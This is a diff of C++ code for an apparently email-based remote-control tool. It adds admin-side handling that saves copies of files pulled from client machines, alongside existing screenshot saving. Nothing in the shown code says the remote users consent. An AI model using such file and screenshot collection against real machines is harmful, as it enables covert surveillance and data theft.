@@ -50,7 +50,6 @@ void ExtractEmailBody(string& buffer) {
 		bodyStart = next;
 		next = buffer.find("\r\n\r\n", bodyStart + 4);
 	}
-	cout << "Size of email reding: " << bodyStart << endl;
 	buffer = buffer.substr(0, bodyStart);
 }
 
@@ -209,8 +208,9 @@ void MyCurl::Preprocess() {
 	end = emailContent.find(';', start);
 	subContent = emailContent.substr(start, end - start);
 }
-void MyCurl::ClientProcess() {
+void MyCurl::ClientProcess() { //Change the result
 	int queryInt = stoi(query);
+	result = "";
 	if (queryInt == 3) {
 		char ch;
 		while (true) {
@@ -225,9 +225,6 @@ void MyCurl::ClientProcess() {
 				break;
 			}
 		}
-	}
-	else if (queryInt == 17) {
-
 	}
 }
 void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
@@ -246,6 +243,19 @@ void MyCurl::AdminProcess(const vector<string> IDs, const int query) {
 						file << subContent;
 						file.close();
 						cout << "Saved screenshot of " + receiverID;
+					}
+					else if (query == 20) { //result is fileName
+						subContent = base64_decode(subContent);
+						string fileName;
+						for (int i = result.size() - 1; i >= 0; i--) {
+							if (result[i] == '/') break;
+							fileName.push_back(result[i]);
+						}
+						reverse(fileName.begin(), fileName.end());
+						fstream file("_Data/Copy/" + fileName + receiverID, ios::out | ios::binary);
+						file << subContent;
+						file.close();
+						cout << "Saved copy file of at " << "_Data/Copy/" + fileName + receiverID;
 					}
 					IDSet.erase(receiverID);
 				}
